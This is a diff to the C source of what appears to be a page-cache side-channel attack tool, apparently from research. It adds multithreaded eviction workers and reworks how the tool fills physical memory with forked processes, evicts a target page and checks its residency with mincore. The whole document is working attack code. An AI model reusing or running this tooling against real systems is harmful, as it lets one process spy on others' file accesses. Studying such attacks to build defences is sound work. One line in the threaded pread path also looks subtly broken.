@@ -123,7 +123,8 @@ const size_t SWITCHES_ARG_COUNT[SWITCHES_COUNT] = {0, 1, 1};
 // component TAGS
 #define WS_MGR_TAG "[WS Manager] "
 #define BS_MGR_TAG "[BS Manager] "
-#define SS_Thread_TAG "[SS Thread] "
+#define ES_THREAD_TAG "[ES Thread] "
+#define SS_THREAD_TAG "[SS Thread] "
 
 /*-----------------------------------------------------------------------------
  * MACROS
@@ -167,7 +168,27 @@ typedef struct _AttackEvictionSet_
     FileMapping mapping_;
     size_t initialise_samples_;
     size_t initialise_max_runs_;
+#ifdef ES_USE_THREADS
+    size_t access_thread_count_;
+    size_t access_threads_per_pu_;
+    DynArray access_threads_;
+    sem_t worker_start_sem_;
+    sem_t worker_join_sem_;
+#endif
 } AttackEvictionSet;
+
+typedef struct _PageAccessThreadESData_
+{
+    pthread_t tid_;
+    FileMapping *eviction_mapping_;
+    size_t page_offset_;
+    size_t size_pages_;
+    void *target_addr_;
+    size_t mincore_check_all_x_bytes_;
+    sem_t *start_sem_;
+    sem_t *join_sem_;
+    size_t accessed_mem_;
+} PageAccessThreadESData;
 
 typedef struct _AttackWorkingSet_
 {
@@ -209,7 +230,7 @@ typedef struct _AttackSuppressSet_
     struct timespec access_sleep_time_;
 } AttackSuppressSet;
 
-typedef struct _PageAccessThreadData_
+typedef struct _PageAccessThreadWSData_
 {
     pthread_mutex_t resident_files_lock_;
     List resident_files_;
@@ -217,7 +238,7 @@ typedef struct _PageAccessThreadData_
     int running_;
     pthread_t tid_;
     pthread_attr_t thread_attr_;
-} PageAccessThreadData;
+} PageAccessThreadWSData;
 
 typedef struct _Attack_
 {
@@ -260,7 +281,7 @@ void closeCachedFileArrayFreeOnly(void *arg);
 void initFillUpProcess(FillUpProcess *fp);
 void closeFillUpProcess(void *arg);
 void closeThread(void *arg);
-void initAttackEvictionSet(AttackEvictionSet *es);
+int initAttackEvictionSet(AttackEvictionSet *es);
 void closeAttackEvictionSet(AttackEvictionSet *es);
 int initAttackWorkingSet(AttackWorkingSet *ws);
 void closeAttackWorkingSet(AttackWorkingSet *ws);
@@ -268,8 +289,10 @@ int initAttackBlockingSet(AttackBlockingSet *bs);
 void closeAttackBlockingSet(AttackBlockingSet *bs);
 int initAttackSuppressSet(AttackSuppressSet *ss);
 void closeAttackSuppressSet(AttackSuppressSet *ss);
-void initPageAccessThreadData(PageAccessThreadData *ps_access_thread_data);
-void closePageAccessThreadData(void *arg);
+void initPageAccessThreadESData(PageAccessThreadESData *ps_access_thread_es_data);
+void closePageAccessThreadESData(void *arg);
+void initPageAccessThreadWSData(PageAccessThreadWSData *ps_access_thread_ws_data);
+void closePageAccessThreadWSData(void *arg);
 int initAttack(Attack *attack);
 void exitAttack(Attack *attack);
 
@@ -280,15 +303,18 @@ int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_
 int pageSeqCmp(void *node, void *data);
 int blockRAM(AttackBlockingSet *bs, size_t fillup_size);
 void releaseRAM(AttackBlockingSet *bs, size_t release_size);
-void releaseRAMCb(void *arg1, void *arg2);
+void releaseRAMCb(void *addr, void *arg);
 size_t evictTargetPage(Attack *attack);
+int spawnESThreads(AttackEvictionSet *es, void *target_addr, size_t mincore_check_all_x_bytes);
+void *pageAccessThreadES(void *arg);
 void *bsManagerThread(void *arg);
 size_t parseAvailableMem(char *meminfo_file_path);
 void *wsManagerThread(void *arg);
-void preparePageAccessThreadData(AttackWorkingSet *ws);
+void preparePageAccessThreadWSData(AttackWorkingSet *ws);
 int reevaluateWorkingSet(AttackWorkingSet *ws);
 int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws);
-void *pageAccessThread(void *arg);
+void *pageAccessThreadWS(void *arg);
+int spawnSuppressThreads(Attack *attack, pthread_attr_t *thread_attr);
 void *suppressThread(void *arg);
 size_t getMappingCount(const unsigned char *status, size_t size_in_pages);
 void usageError(char *app_name);
@@ -594,24 +620,26 @@ int main(int argc, char *argv[])
                attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
     }
 
+// if wanted use eviction threads (let them be auto moved by the os to idle cores)
+#ifdef ES_USE_THREADS
+    if (spawnESThreads(&attack.eviction_set_, attack.target_addr_, attack.mincore_check_all_x_bytes_) != 0)
+    {
+        printf(FAIL "Error at spawnESThreads...\n");
+        goto error;
+    }
+#endif
+
     // next thread(s) by default on different core
     CPU_ZERO(&cpu_mask);
     CPU_SET(used_pus, &cpu_mask);
     pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
     used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
 
-    // readahead surpressing threads for target
-    for (size_t i = 0; i < attack.ss_thread_count_; i++)
+    // spawn surpressing set worker threads
+    if (spawnSuppressThreads(&attack, &thread_attr) != 0)
     {
-        pthread_t tid;
-
-        // by default run on a different core if possible
-        if (pthread_create(&tid, &thread_attr, suppressThread, (void *)&attack.suppress_set_) != 0)
-        {
-            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
-        }
-
-        dynArrayAppend(&attack.ss_threads_, &tid);
+        printf(FAIL "Error at spawnSSThreads...\n");
+        goto error;
     }
 
     // manager for working set
@@ -807,6 +835,7 @@ void closeCachedFileArrayFreeOnly(void *arg)
 void initFillUpProcess(FillUpProcess *fp)
 {
     memset(fp, 0, sizeof(FillUpProcess));
+    fp->pid_ = -1;
 }
 
 void closeFillUpProcess(void *arg)
@@ -827,21 +856,44 @@ void closeThread(void *arg)
     pthread_join(*thread, NULL);
 }
 
-void initAttackEvictionSet(AttackEvictionSet *es)
+int initAttackEvictionSet(AttackEvictionSet *es)
 {
     memset(es, 0, sizeof(AttackEvictionSet));
     initFileMapping(&es->mapping_);
+
+#ifdef ES_USE_THREADS
+    if (sem_init(&es->worker_start_sem_, 0, 0) != 0)
+    {
+        return -1;
+    }
+    if (sem_init(&es->worker_join_sem_, 0, 0) != 0)
+    {
+        return -1;
+    }
+    if (!dynArrayInit(&es->access_threads_, sizeof(PageAccessThreadESData), ARRAY_INIT_CAP))
+    {
+        return -1;
+    }
+#endif
+
+    return 0;
 }
 
 void closeAttackEvictionSet(AttackEvictionSet *es)
 {
     closeFileMapping(&(es->mapping_));
+
+#ifdef ES_USE_THREADS
+    sem_destroy(&es->worker_start_sem_);
+    sem_destroy(&es->worker_join_sem_);
+    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
+#endif
 }
 
 int initAttackWorkingSet(AttackWorkingSet *ws)
 {
     memset(ws, 0, sizeof(AttackWorkingSet));
-    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadData), ARRAY_INIT_CAP))
+    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), ARRAY_INIT_CAP))
     {
         return -1;
     }
@@ -855,7 +907,7 @@ int initAttackWorkingSet(AttackWorkingSet *ws)
 
 void closeAttackWorkingSet(AttackWorkingSet *ws)
 {
-    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadData);
+    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
     listDestroy(&ws->resident_files_, closeCachedFile);
     listDestroy(&ws->non_resident_files_, closeCachedFile);
     listDestroy(&ws->tmp_resident_files_, closeCachedFile);
@@ -865,7 +917,7 @@ void closeAttackWorkingSet(AttackWorkingSet *ws)
 int initAttackBlockingSet(AttackBlockingSet *bs)
 {
     memset(bs, 0, sizeof(AttackBlockingSet));
-    if (!dynArrayInit(&bs->fillup_processes_, sizeof(pid_t), ARRAY_INIT_CAP))
+    if (!dynArrayInit(&bs->fillup_processes_, sizeof(FillUpProcess), ARRAY_INIT_CAP))
     {
         return -1;
     }
@@ -899,21 +951,34 @@ void closeAttackSuppressSet(AttackSuppressSet *ss)
     dynArrayDestroy(&ss->target_readahead_window_, NULL);
 }
 
-void initPageAccessThreadData(PageAccessThreadData *page_access_thread_data)
+void initPageAccessThreadESData(PageAccessThreadESData *page_access_thread_es_data)
 {
-    memset(page_access_thread_data, 0, sizeof(PageAccessThreadData));
-    pthread_mutex_init(&page_access_thread_data->resident_files_lock_, NULL);
+    memset(page_access_thread_es_data, 0, sizeof(PageAccessThreadESData));
 }
 
-void closePageAccessThreadData(void *arg)
+void closePageAccessThreadESData(void *arg)
 {
-    PageAccessThreadData *page_access_thread_data = arg;
+    PageAccessThreadESData *page_access_thread_es_data = arg;
+    // ensures thread stops when currently inside sem_wait
+    pthread_cancel(page_access_thread_es_data->tid_);
+    pthread_join(page_access_thread_es_data->tid_, NULL);
+}
 
-    if (page_access_thread_data->running_)
+void initPageAccessThreadWSData(PageAccessThreadWSData *page_access_thread_ws_data)
+{
+    memset(page_access_thread_ws_data, 0, sizeof(PageAccessThreadWSData));
+    pthread_mutex_init(&page_access_thread_ws_data->resident_files_lock_, NULL);
+}
+
+void closePageAccessThreadWSData(void *arg)
+{
+    PageAccessThreadWSData *page_access_thread_ws_data = arg;
+
+    if (page_access_thread_ws_data->running_)
     {
-        __atomic_store_n(&page_access_thread_data->running_, 0, __ATOMIC_RELAXED);
-        pthread_join(page_access_thread_data->tid_, NULL);
-        pthread_attr_destroy(&page_access_thread_data->thread_attr_);
+        __atomic_store_n(&page_access_thread_ws_data->running_, 0, __ATOMIC_RELAXED);
+        pthread_join(page_access_thread_ws_data->tid_, NULL);
+        pthread_attr_destroy(&page_access_thread_ws_data->thread_attr_);
     }
 }
 
@@ -921,7 +986,10 @@ int initAttack(Attack *attack)
 {
     memset(attack, 0, sizeof(Attack));
 
-    initAttackEvictionSet(&attack->eviction_set_);
+    if (initAttackEvictionSet(&attack->eviction_set_) != 0)
+    {
+        return -1;
+    }
 
     if (initAttackWorkingSet(&attack->working_set_) != 0)
     {
@@ -980,6 +1048,11 @@ void configAttack(Attack *attack)
     attack->use_attack_bs_ |= DEF_USE_ATTACK_BS;
     attack->mlock_self_ |= DEF_MLOCK_SELF;
 
+#ifdef ES_USE_THREADS
+    attack->eviction_set_.access_thread_count_ = DEF_ES_ACCESS_THREAD_COUNT;
+    attack->eviction_set_.access_threads_per_pu_ = DEF_ES_ACCESS_THREADS_PER_PU;
+#endif
+
     attack->working_set_.evaluation_ |= DEF_WS_EVALUATION;
     attack->working_set_.eviction_ignore_evaluation_ |= DEF_WS_EVICTION_IGNORE_EVALUATION;
     attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
@@ -1020,8 +1093,7 @@ int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path)
         .size_ = 0,
         .size_pages_ = 0,
         .resident_memory_ = 0,
-        .resident_page_sequences_ = {0}
-    };
+        .resident_page_sequences_ = {0}};
     size_t checked_files = 0;
     size_t memory_checked = 0;
     size_t mem_in_ws = 0;
@@ -1157,7 +1229,7 @@ int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_
     current_cached_file->resident_memory_ = 0;
 
     // mmap file if not already mapped
-    if(current_cached_file->addr_ == MAP_FAILED)
+    if (current_cached_file->addr_ == MAP_FAILED)
     {
         current_cached_file->addr_ =
             mmap(NULL, current_cached_file->size_, PROT_READ | PROT_EXEC, MAP_PRIVATE, current_cached_file->fd_, 0);
@@ -1241,18 +1313,18 @@ error:
 cleanup:
 
 #ifdef WS_MAP_FILE
-    if(current_cached_file->fd_ > 0) 
+    if (current_cached_file->fd_ > 0)
     {
         close(current_cached_file->fd_);
         current_cached_file->fd_ = -1;
     }
-#else 
-    if(current_cached_file->addr_ != MAP_FAILED)
+#else
+    if (current_cached_file->addr_ != MAP_FAILED)
     {
         munmap(current_cached_file->addr_, current_cached_file->size_);
         current_cached_file->addr_ = MAP_FAILED;
     }
-#endif 
+#endif
 
     free(page_status);
     return ret;
@@ -1270,42 +1342,46 @@ int pageSeqCmp(void *node, void *data)
 
 int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
 {
-    pid_t child_pid;
-    void *fillup_mem;
-    sem_t *sem;
+    int ret = 0;
+    FillUpProcess child_process;
+    void *fillup_mem = NULL;
+    sem_t *sem = MAP_FAILED;
+    size_t needed_childs = 0;
+
+    // init child structure
+    initFillUpProcess(&child_process);
+    child_process.fillup_size_ = bs->def_fillup_size_;
 
     // create a shared semaphore
     sem = mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (sem == MAP_FAILED)
     {
         printf(FAIL BS_MGR_TAG "Error (%s) at mmap...\n", strerror(errno));
-        return -1;
+        goto error;
     }
-
     if (sem_init(sem, 1, 0))
     {
         printf(FAIL BS_MGR_TAG "Error (%s) at sem_init...\n", strerror(errno));
-        return -1;
+        goto error;
     }
 
-    DEBUG_PRINT((DEBUG BS_MGR_TAG "Going to block %zu kB of physical memory, need %zu child processes...\n", fillup_size / 1024,
-                 fillup_size / bs->def_fillup_size_));
-
-    // round up
-    for (size_t i = 1; i <= (fillup_size + bs->def_fillup_size_ - 1) / bs->def_fillup_size_; i++)
+    // round down
+    needed_childs = fillup_size / bs->def_fillup_size_;
+    for (size_t i = 1; i <= needed_childs; i++)
     {
-        child_pid = fork();
+        child_process.pid_ = fork();
 
-        if (child_pid < 0)
+        if (child_process.pid_  < 0)
         {
+            // parent
             printf(FAIL BS_MGR_TAG "Error (%s) at fork for block ram child..\n", strerror(errno));
-            return -1;
+            goto error;
         }
-        else if (child_pid == 0)
+        else if (child_process.pid_ == 0)
         {
             // child
-            DEBUG_PRINT(
-                (DEBUG BS_MGR_TAG "New child %zu with %zu kB dirty memory spawned...\n", i, bs->def_fillup_size_ / 1024));
+            DEBUG_PRINT((DEBUG BS_MGR_TAG "New child %zu with %zu kB dirty memory will be spawned...\n", 
+                i, bs->def_fillup_size_ / 1024));
 
             fillup_mem = mmap(
                 NULL, bs->def_fillup_size_, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
@@ -1346,44 +1422,96 @@ int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
         if (sem_wait(sem))
         {
             printf(FAIL BS_MGR_TAG "Error (%s) at sem_wait...\n", strerror(errno));
-            return -1;
+            goto error;
         }
 
         // error at dynArrayAppend <=> child could not be added
-        if (!dynArrayAppend(&bs->fillup_processes_, &child_pid))
+        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
         {
-            // kill child
-            kill(child_pid, SIGKILL);
             printf(FAIL BS_MGR_TAG "Error (%s) at dynArrayAppend...\n", strerror(errno));
-            return -1;
+            goto error;
         }
     }
+    printf(INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024);
 
-    munmap(sem, sizeof(sem_t));
-    return 0;
+    goto cleanup;
+error:
+    ret = -1;
+    // kill rouge child if existing
+    if(child_process.pid_ > 0)
+    {
+        kill(child_process.pid_, SIGKILL);
+    }
+
+cleanup:
+    if(sem != MAP_FAILED)
+    {
+        sem_destroy(sem);
+        munmap(sem, sizeof(sem_t));
+    }
+
+    return ret;
 }
 
 void releaseRAM(AttackBlockingSet *bs, size_t release_size)
 {
-    size_t released;
+    size_t released = 0;
+    size_t released_sum = 0;
 
-    DEBUG_PRINT((DEBUG BS_MGR_TAG "Releasing %zu kB of blocking memory\n", release_size / 1024));
+    DEBUG_PRINT((DEBUG BS_MGR_TAG "Trying to release %zu kB of blocking memory\n", release_size / 1024));
 
-    while (release_size > 0 && bs->fillup_processes_.size_ > 0)
+    while (released_sum < release_size && bs->fillup_processes_.size_ > 0)
     {
         dynArrayPop(&bs->fillup_processes_, releaseRAMCb, &released);
-        release_size = (release_size > released) ? release_size - released : 0;
+        released_sum += released;
     }
+    printf(INFO BS_MGR_TAG "Released %zu kB...\n", released_sum / 1024);
 }
 
-void releaseRAMCb(void *arg1, void *arg2)
+void releaseRAMCb(void *addr, void *arg)
 {
-    FillUpProcess *fp = arg1;
-    size_t *released = arg2;
+    FillUpProcess *fp = addr;
+    size_t *released = arg;
 
     kill(fp->pid_, SIGKILL);
     *released = fp->fillup_size_;
 }
+
+#ifdef ES_USE_THREADS
+
+size_t evictTargetPage(Attack *attack)
+{
+    size_t accessed_mem_sum = 0;
+
+    // resume worker threads
+    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
+    {
+        // in case of error skip
+        if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
+        {
+            printf(WARNING "Error (%s) at sem_post...\n", strerror(errno));
+            continue;
+        }
+    }
+
+    // wait for completion of the worker threads
+    for (size_t t = 0; t < attack->eviction_set_.access_thread_count_; t++)
+    {
+        // in case of error skip
+        if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
+        {
+            printf(WARNING "Error (%s) at sem_wait...\n", strerror(errno));
+            continue;
+        }
+
+        PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
+        accessed_mem_sum += thread_data->accessed_mem_;
+    }
+
+    return accessed_mem_sum;
+}
+
+#else
 
 size_t evictTargetPage(Attack *attack)
 {
@@ -1414,9 +1542,10 @@ size_t evictTargetPage(Attack *attack)
         if (accessed_mem % attack->mincore_check_all_x_bytes_ == 0)
         {
             // check if target page was evicted
-            if (mincore(attack->target_addr_, PAGE_SIZE, &target_page_status) < 0)
+            if (mincore(attack->target_addr_, PAGE_SIZE, &target_page_status) != 0)
             {
-                printf(FAIL "Error (%s) at mincore...\n", strerror(errno));
+                // in case of error just print warnings and access whole ES
+                printf(WARNING "Error (%s) at mincore...\n", strerror(errno));
             }
             else if (!(target_page_status & 1))
             {
@@ -1434,20 +1563,22 @@ size_t evictTargetPage(Attack *attack)
 #ifdef _DETAILED_EVICTION_SET_STAT_
 
         clock_gettime(CLOCK_MONOTONIC, &access_start);
-    #ifdef EVICTION_USE_PREAD
+#ifdef ES_USE_PREAD
         if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
         {
+            // in case of error just print warnings and access whole ES
             printf(WARNING "Error (%s) at pread...\n", strerror(errno));
         }
-        #ifdef PREAD_TWO_TIMES
+#ifdef PREAD_TWO_TIMES
         if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
         {
+            // in case of error just print warnings and access whole ES
             printf(WARNING "Error (%s) at pread...\n", strerror(errno));
         }
-        #endif
-    #else 
+#endif
+#else
         tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + (p)*PAGE_SIZE);
-    #endif
+#endif
         clock_gettime(CLOCK_MONOTONIC, &access_end);
 
         // calculate
@@ -1464,22 +1595,23 @@ size_t evictTargetPage(Attack *attack)
         }
 
 #else
-    #ifdef EVICTION_USE_PREAD
+#ifdef ES_USE_PREAD
         if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
         {
+            // in case of error just print warnings and access whole ES
             printf(WARNING "Error (%s) at pread...\n", strerror(errno));
         }
-        #ifdef PREAD_TWO_TIMES
-            if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
-            {
-                printf(WARNING "Error (%s) at pread...\n", strerror(errno));
-            }
-        #endif
-    #else 
-        tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p*PAGE_SIZE);
-    #endif
+#ifdef PREAD_TWO_TIMES
+        if (pread(attack->eviction_set_.mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
+        {
+            // in case of error just print warnings and access whole ES
+            printf(WARNING "Error (%s) at pread...\n", strerror(errno));
+        }
 #endif
-
+#else
+        tmp = *((uint8_t *)attack->eviction_set_.mapping_.addr_ + p * PAGE_SIZE);
+#endif
+#endif
         accessed_mem += PAGE_SIZE;
     }
 
@@ -1492,6 +1624,157 @@ size_t evictTargetPage(Attack *attack)
 #endif
 
     return accessed_mem;
+}
+
+#endif
+
+int spawnESThreads(AttackEvictionSet *es, void *target_addr, size_t mincore_check_all_x_bytes)
+{
+    int ret = 0;
+    size_t processed_pages = 0;
+    size_t pages_per_thread_floor = es->mapping_.size_pages_ / es->access_thread_count_;
+    pthread_attr_t thread_attr;
+    cpu_set_t cpu_mask;
+
+    pthread_attr_init(&thread_attr);
+
+    //  reserve space for access thread data structures
+    if (dynArrayResize(&es->access_threads_, es->access_thread_count_) == NULL)
+    {
+        printf(FAIL "Could not reserve memory...\n");
+        goto error;
+    }
+
+    // prepare thread_data objects
+    for (size_t t = 0; t < es->access_thread_count_ - 1; t++)
+    {
+        PageAccessThreadESData *thread_data = dynArrayGet(&es->access_threads_, t);
+        initPageAccessThreadESData(thread_data);
+        thread_data->eviction_mapping_ = &es->mapping_;
+        thread_data->page_offset_ = processed_pages;
+        thread_data->size_pages_ = pages_per_thread_floor;
+        thread_data->target_addr_ = target_addr;
+        thread_data->mincore_check_all_x_bytes_ = mincore_check_all_x_bytes;
+        thread_data->start_sem_ = &es->worker_start_sem_;
+        thread_data->join_sem_ = &es->worker_join_sem_;
+        processed_pages += pages_per_thread_floor;
+    }
+    // prepare thread_data object for last thread
+    PageAccessThreadESData *thread_data = dynArrayGet(&es->access_threads_, es->access_thread_count_ - 1);
+    initPageAccessThreadESData(thread_data);
+    thread_data->eviction_mapping_ = &es->mapping_;
+    thread_data->page_offset_ = processed_pages;
+    thread_data->size_pages_ = es->mapping_.size_pages_ - processed_pages;
+    thread_data->target_addr_ = target_addr;
+    thread_data->mincore_check_all_x_bytes_ = mincore_check_all_x_bytes;
+    thread_data->start_sem_ = &es->worker_start_sem_;
+    thread_data->join_sem_ = &es->worker_join_sem_;
+
+    // spin up worker threads
+    for (size_t t = 0; t < es->access_thread_count_; t++)
+    {
+        CPU_ZERO(&cpu_mask);
+        CPU_SET(used_pus, &cpu_mask);
+        pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
+
+        PageAccessThreadESData *thread_data = dynArrayGet(&es->access_threads_, t);
+        if (pthread_create(&thread_data->tid_, &thread_attr, pageAccessThreadES, thread_data) != 0)
+        {
+            printf(FAIL "Error (%s) at creating ES access thread...\n", strerror(errno));
+            goto error;
+        }
+
+        // increase to next core if wanted
+        if ((t + 1) % es->access_threads_per_pu_ == 0)
+        {
+            // NOTE has to be locked when accessed concourrently in future
+            used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
+        }
+    }
+
+    goto cleanup;
+
+error:
+    ret = -1;
+    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
+
+cleanup:
+    pthread_attr_destroy(&thread_attr);
+
+    return ret;
+}
+
+void *pageAccessThreadES(void *arg)
+{
+    PageAccessThreadESData *page_thread_data = arg;
+    size_t accessed_mem = 0;
+    unsigned char target_page_status = 0;
+    volatile uint8_t tmp = 0;
+    (void)tmp;
+
+    printf(INFO ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) running on core %d.\n",
+           page_thread_data->page_offset_, page_thread_data->size_pages_, sched_getcpu());
+    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
+    {
+        if (sem_wait(page_thread_data->start_sem_) != 0)
+        {
+            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_wait (%p)...\n", strerror(errno), (void *)page_thread_data->start_sem_);
+            goto error;
+        }
+
+        accessed_mem = 0;
+        for (size_t p = page_thread_data->page_offset_;
+             p < page_thread_data->page_offset_ + page_thread_data->size_pages_;
+             p++)
+        {
+            if (accessed_mem % page_thread_data->mincore_check_all_x_bytes_ == 0)
+            {
+                // check if target page was evicted
+                if (mincore(page_thread_data->target_addr_, PAGE_SIZE, &target_page_status) < 0)
+                {
+                    // in case of error just print warnings and access whole ES
+                    printf(FAIL ES_THREAD_TAG "Error (%s) at mincore...\n", strerror(errno));
+                }
+                else if (!(target_page_status & 1))
+                {
+                    break;
+                }
+            }
+
+#ifdef ES_USE_PREAD
+            if (pread(page_thread_data->eviction_mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
+            {
+                // in case of error just print warnings and access whole ES
+                printf(WARNING ES_THREAD_TAG "Error (%s) at pread...\n", strerror(errno));
+            }
+#ifdef PREAD_TWO_TIMES
+            if (pread(page_thread_data->eviction_mapping_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
+            {
+                // in case of error just print warnings and access whole ES
+                printf(WARNING ES_THREAD_TAG "Error (%s) at pread...\n", strerror(errno));
+            }
+#endif
+#else
+            tmp = *((uint8_t *)page_thread_data->eviction_mapping_->addr_ + p * PAGE_SIZE);
+#endif
+            accessed_mem += PAGE_SIZE;
+        }
+
+        DEBUG_PRINT((DEBUG ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) accessed %zu kB.\n",
+                     page_thread_data->page_offset_, page_thread_data->size_pages_, accessed_mem / 1024));
+        page_thread_data->accessed_mem_ = accessed_mem;
+        if (sem_post(page_thread_data->join_sem_) != 0)
+        {
+            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_post (%p)...\n", strerror(errno), (void *)page_thread_data->join_sem_);
+            goto error;
+        }
+    }
+
+    return NULL;
+
+error:
+
+    return (void *)-1;
 }
 
 void *bsManagerThread(void *arg)
@@ -1512,17 +1795,17 @@ void *bsManagerThread(void *arg)
         if (available_mem < bs->min_available_mem_)
         {
             mem_diff = available_mem_goal - available_mem;
-            printf(BS_MGR_TAG "Too less physical memory available, releasing %zu kB...\n", mem_diff / 1024);
+            printf(INFO BS_MGR_TAG "Too less physical memory available, trying to release %zu kB...\n", mem_diff / 1024);
             releaseRAM(bs, mem_diff);
         }
         else if (available_mem > bs->max_available_mem_)
         {
-            // /4 * 3 for slower convergence
-            mem_diff = (available_mem - available_mem_goal) / 4 * 3;
-
-            if (mem_diff >= bs->def_fillup_size_)
+            // * 3 / 4 for slower convergence (less overshoot)
+            mem_diff = (available_mem - available_mem_goal) * 3 / 4;
+            // blocking rounds down, only down when at least as big as one unit
+            if(mem_diff >= bs->def_fillup_size_)
             {
-                printf(BS_MGR_TAG "Too much physical memory available, blocking %zu kB...\n", mem_diff / 1024);
+                printf(INFO BS_MGR_TAG "Too much physical memory available, trying to block %zu kB...\n", mem_diff / 1024);
                 blockRAM(bs, mem_diff);
             }
         }
@@ -1617,6 +1900,12 @@ void *wsManagerThread(void *arg)
     List tmp_list_swap2;
     size_t tmp_size_t;
 
+    // if access thread count is zero, stop operation as senseless
+    if (ws->access_thread_count_ == 0)
+    {
+        return NULL;
+    }
+
     //  reserve space for access thread data structures
     if (dynArrayResize(&ws->access_threads_, ws->access_thread_count_) == NULL)
     {
@@ -1626,15 +1915,15 @@ void *wsManagerThread(void *arg)
     for (size_t t = 0; t < ws->access_thread_count_; t++)
     {
         // initialise access thread data structures
-        initPageAccessThreadData(dynArrayGet(&ws->access_threads_, t));
+        initPageAccessThreadWSData(dynArrayGet(&ws->access_threads_, t));
     }
     // split up resident files into worker thread units
-    preparePageAccessThreadData(ws);
+    preparePageAccessThreadWSData(ws);
 
     // spin up worker threads
     for (size_t t = 0; t < ws->access_thread_count_; t++)
     {
-        PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
+        PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
 
         // used to spin up worker threads on different CPUs
         pthread_attr_init(&thread_data->thread_attr_);
@@ -1643,11 +1932,11 @@ void *wsManagerThread(void *arg)
         CPU_SET(used_pus, &cpu_mask);
         pthread_attr_setaffinity_np(&thread_data->thread_attr_, sizeof(cpu_set_t), &cpu_mask);
 
-        printf(WS_MGR_TAG "Thread %zu configured to run on core %d and to access %zu files.\n", t, used_pus, thread_data->resident_files_.count_);
+        printf(INFO WS_MGR_TAG "Thread %zu configured to run on core %d and to access %zu files.\n", t, used_pus, thread_data->resident_files_.count_);
         thread_data->running_ = 1;
-        if (pthread_create(&thread_data->tid_, &thread_data->thread_attr_, pageAccessThread, thread_data) != 0)
+        if (pthread_create(&thread_data->tid_, &thread_data->thread_attr_, pageAccessThreadWS, thread_data) != 0)
         {
-            printf(FAIL WS_MGR_TAG "Error (%s) at creating access thread...\n", strerror(errno));
+            printf(FAIL WS_MGR_TAG "Error (%s) at creating WS access thread...\n", strerror(errno));
             goto error;
         }
 
@@ -1685,7 +1974,7 @@ void *wsManagerThread(void *arg)
             // acquire locks
             for (size_t t = 0; t < ws->access_thread_count_; t++)
             {
-                PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
+                PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
 
                 if (thread_data->running_)
                 {
@@ -1706,12 +1995,12 @@ void *wsManagerThread(void *arg)
             ws->tmp_mem_in_ws_ = tmp_size_t;
 
             // rebalance files for threads
-            preparePageAccessThreadData(ws);
+            preparePageAccessThreadWSData(ws);
 
             // release locks
             for (size_t t = 0; t < ws->access_thread_count_; t++)
             {
-                PageAccessThreadData *thread_data = dynArrayGet(&ws->access_threads_, t);
+                PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
 
                 if (thread_data->running_)
                 {
@@ -1730,16 +2019,15 @@ error:
     ret = (void *)-1;
 
 cleanup:
-
-    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadData);
+    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
 
     return ret;
 }
 
-void preparePageAccessThreadData(AttackWorkingSet *ws)
+void preparePageAccessThreadWSData(AttackWorkingSet *ws)
 {
     ListNode *current_head = NULL;
-    size_t files_per_thread = 0;
+    size_t files_per_thread_floor = 0;
     size_t processed_files = 0;
     size_t t = 0;
 
@@ -1751,22 +2039,21 @@ void preparePageAccessThreadData(AttackWorkingSet *ws)
     // current head
     current_head = ws->resident_files_.head_;
     // pages per thread (rounded down)
